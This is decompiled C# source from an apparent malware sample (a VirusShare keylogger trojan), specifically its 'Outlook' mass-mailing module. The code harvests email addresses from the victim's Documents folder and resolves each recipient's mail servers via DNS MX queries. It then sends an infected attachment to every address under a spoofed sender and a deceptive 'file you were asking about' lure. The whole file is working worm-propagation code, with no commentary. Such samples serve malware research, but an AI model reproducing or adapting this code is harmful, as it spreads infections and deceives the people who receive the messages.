// Decompiled with JetBrains decompiler
// Type: Roy.Outlook
// Assembly: Roy, Version=2.3.3.234, Culture=neutral, PublicKeyToken=null
// MVID: 2E5855C9-3623-47AC-87B3-574423C889E6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan-Spy.MSIL.KeyLogger.ghj-a49d165972c0534f6ef5730aa1e0dd66ae9dc93656c6cd8ad725852281757a19.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace Roy
{
  [StandardModule]
  internal sealed class Outlook
  {
    private static string me = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName);
    private static string myDocs = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
    private static ArrayList arrEmails = new ArrayList();
    private static ArrayList arInfect = new ArrayList();

    [DllImport("dnsapi", EntryPoint = "DnsQuery_W", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int Dns(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string strName,
      int intType,
      int intOpt,
      int intServer,
      ref IntPtr pResult,
      int intReserved);

    public static void Send()
    {
      Outlook.arrEmails = Outlook.SearchEmails(Outlook.myDocs, "*.*");
      ArrayList arrEmails = Outlook.arrEmails;
      arrEmails.Reverse();
      string file = Outlook.GetFile();
      if (Operators.CompareString(file, "", false) == 0 || Outlook.arrEmails.Count <= 0)
        return;
      Attachment attachment = new Attachment(file);
      IEnumerator enumerator = Outlook.arrEmails.GetEnumerator();
      ArrayList arrayList = new ArrayList();
      while (enumerator.MoveNext())
      {
        string str1 = Convert.ToString(RuntimeHelpers.GetObjectValue(enumerator.Current));
        foreach (object obj in arrEmails)
        {
          string str2 = Convert.ToString(RuntimeHelpers.GetObjectValue(obj));
          if (Operators.CompareString(str1, str2, false) != 0 && !arrayList.Contains((object) str1))
          {
            arrayList.Add((object) str1);
            MailAddress to = new MailAddress(str1);
            MailMessage message = new MailMessage(new MailAddress(str2), to);
            message.Subject = "Hey";
            message.Body = "Hey hows it going? I attached that file you were asking about. Let me know if it worKs for you or not. I'm not sure what I'm going to do the tommorow maybe get some coffee and do some shopping. Well give me a call later okay?";
            message.Attachments.Add(attachment);
            string mxRecords = Outlook.GetMXRecords(str1.Substring(str1.IndexOf("@")).Replace("@", string.Empty));
            try
            {
              new SmtpClient(mxRecords).Send(message);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
      }
      attachment.Dispose();
    }

    private static ArrayList SearchEmails(string dir, string fileType)
    {
      ArrayList arrayList = new ArrayList();
      FileInfo[] files = new DirectoryInfo(dir).GetFiles(fileType);
      int index = 0;
      while (index < files.Length)
      {
        FileInfo fileInfo = files[index];
        Console.WriteLine(fileInfo.FullName);
        StreamReader streamReader = File.OpenText(fileInfo.FullName);
        string target;
        while (Outlook.InlineAssignHelper<string>(ref target, streamReader.ReadLine()) != null)
        {
          string addr = Outlook.ExtractAddr(target);
          if (Operators.CompareString(addr, "", false) != 0 && !arrayList.Contains((object) addr) && new Regex("^([a-zA-Z0-9_\\-\\.]+)@((\\[[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.)|(([a-zA-Z0-9\\-]+\\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\\]?)$").IsMatch(addr) && !arrayList.Contains((object) addr))
            arrayList.Add((object) addr);
        }
        checked { ++index; }
      }
      return arrayList;
    }

    public static string ExtractAddr(string InputData)
    {
      int num1 = checked (InputData.IndexOf("@", 0) + 1);
      int num2 = 1;
      int num3 = InputData.Length;
      string addr = "";
      if (num1 == 0)
        return addr;
      int num4 = checked (num1 - 1);
      while (num4 >= 1)
      {
        string Left = InputData.Substring(checked (num4 - 1), 1);
        if (Operators.CompareString(Left, " ", false) == 0 | Operators.CompareString(Left, "<", false) == 0 | Operators.CompareString(Left, "(", false) == 0 | Operators.CompareString(Left, ":", false) == 0 | Operators.CompareString(Left, ",", false) == 0 | Operators.CompareString(Left, "[", false) == 0)
        {
          num2 = checked (num4 + 1);
          break;
        }
        checked { num4 += -1; }
      }
      int num5 = checked (num1 + 1);
      int length = InputData.Length;
      int num6 = num5;
      while (num6 <= length)
      {
        string Left = InputData.Substring(checked (num6 - 1), 1);
        if (Operators.CompareString(Left, " ", false) == 0 | Operators.CompareString(Left, ">", false) == 0 | Operators.CompareString(Left, ")", false) == 0 | Operators.CompareString(Left, ":", false) == 0 | Operators.CompareString(Left, ",", false) == 0 | Operators.CompareString(Left, "]", false) == 0)
        {
          num3 = checked (num6 - 1);
          break;
        }
        checked { ++num6; }
      }
      return Regex.Replace(InputData.Substring(checked (num2 - 1), checked (num3 - num2 + 1)), "<(.|\\n)*?>", string.Empty).Replace("&nbsp;", "").Replace(" ", "").Replace("\"", "");
    }

    private static string GetFile()
    {
      string file = "";
      if (Outlook.arInfect.Count > 0)
      {
        foreach (object obj in Outlook.arInfect)
          file = Convert.ToString(RuntimeHelpers.GetObjectValue(obj));
      }
      return file;
    }

    public static string GetMXRecords(string host)
    {
      IntPtr zero1 = IntPtr.Zero;
      IntPtr zero2 = IntPtr.Zero;
      int num = Outlook.Dns(ref host, 15, 8, 0, ref zero1, 0);
      string mxRecords = "";
      Outlook.STRMX structure;
      if (num != 0)
      {
        mxRecords = host;
      }
      else
      {
        for (IntPtr ptr = zero1; !ptr.Equals((object) IntPtr.Zero); ptr = structure.pNext)
        {
          structure = (Outlook.STRMX) Marshal.PtrToStructure(ptr, typeof (Outlook.STRMX));
          if (structure.sType == (short) 15)
          {
            string stringAuto = Marshal.PtrToStringAuto(structure.pNameEx);
            if (Operators.CompareString(stringAuto, "", false) != 0)
              mxRecords = stringAuto;
          }
        }
      }
      return mxRecords;
    }

    private static T InlineAssignHelper<T>(ref T target, T value)
    {
      target = value;
      return value;
    }

    private struct STRMX
    {
      public IntPtr pNext;
      public string strName;
      public short sType;
      public int intFlag;
      public int intTTL;
      public int intRes;
      public IntPtr pNameEx;
    }
  }
}
